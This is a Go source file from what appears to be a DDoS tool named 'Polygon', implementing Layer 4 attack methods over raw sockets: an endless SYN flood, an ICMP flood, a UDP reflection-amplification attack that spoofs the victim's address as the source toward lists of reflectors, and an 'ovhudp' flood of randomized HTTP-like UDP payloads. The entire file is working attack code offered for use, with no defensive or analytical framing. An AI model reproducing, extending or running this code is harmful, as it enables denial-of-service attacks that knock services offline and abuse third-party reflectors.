//go:build linux

package attack

import (
	crand "crypto/rand"
	"math/rand"
	"net"
	"syscall"

	"Polygon/packet"
	"Polygon/stats"
)

func (l *Layer4) rawSocket(proto int) (int, error) {
	return syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, proto)
}

func (l *Layer4) sendRaw(fd int, pkt []byte, dstIP net.IP, dstPort uint16) error {
	var addr syscall.SockaddrInet4
	copy(addr.Addr[:], dstIP.To4())
	addr.Port = int(dstPort)
	if err := syscall.Sendto(fd, pkt, 0, &addr); err != nil {
		return err
	}
	stats.AddBytes(int64(len(pkt)))
	stats.AddRequest(1)
	return nil
}

func (l *Layer4) syn() {
	fd, err := l.rawSocket(syscall.IPPROTO_TCP)
	if err != nil {
		return
	}
	defer syscall.Close(fd)
	_ = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	dstIP := net.ParseIP(l.Target)
	for {
		pkt := packet.BuildSYN(l.LocalIP, dstIP, l.Port)
		if err := l.sendRaw(fd, pkt, dstIP, l.Port); err != nil {
			return
		}
	}
}

func (l *Layer4) icmp() {
	fd, err := l.rawSocket(syscall.IPPROTO_ICMP)
	if err != nil {
		return
	}
	defer syscall.Close(fd)
	_ = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	dstIP := net.ParseIP(l.Target)
	payloadSize := 16 + rand.Intn(1008)
	pkt := packet.BuildICMP(l.LocalIP, dstIP, payloadSize)
	for {
		if err := l.sendRaw(fd, pkt, dstIP, 0); err != nil {
			return
		}
	}
}

func (l *Layer4) amp(payload []byte, reflectorPort uint16) {
	if len(l.Refs) == 0 {
		return
	}
	fd, err := l.rawSocket(syscall.IPPROTO_UDP)
	if err != nil {
		return
	}
	defer syscall.Close(fd)
	_ = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	targetIP := net.ParseIP(l.Target)
	for {
		for _, ref := range l.Refs {
			refIP := net.ParseIP(ref)
			pkt := packet.BuildAMP(targetIP, l.Port, refIP, reflectorPort, payload)
			_ = l.sendRaw(fd, pkt, refIP, reflectorPort)
		}
	}
}

func (l *Layer4) ovhudp() {
	fd, err := l.rawSocket(syscall.IPPROTO_UDP)
	if err != nil {
		return
	}
	defer syscall.Close(fd)
	_ = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	dstIP := net.ParseIP(l.Target)
	methods := []string{"PGET", "POST", "HEAD", "OPTIONS", "PURGE"}
	paths := []string{"/0/0/0/0/0/0", "/", "/null", "/%00%00%00%00"}

	for {
		method := methods[rand.Intn(len(methods))]
		path := paths[rand.Intn(len(paths))]
		body := make([]byte, 1024+rand.Intn(1024))
		_, _ = crand.Read(body)
		payload := []byte(method + " " + path + " HTTP/1.1\r\nHost: " +
			net.JoinHostPort(l.Target, itoa(int(l.Port))) + "\r\n\r\n")
		payload = append(payload, body...)
		pkt := packet.BuildAMP(l.LocalIP, uint16(32768+rand.Intn(32767)), dstIP, l.Port, payload)
		_ = l.sendRaw(fd, pkt, dstIP, l.Port)
	}
}
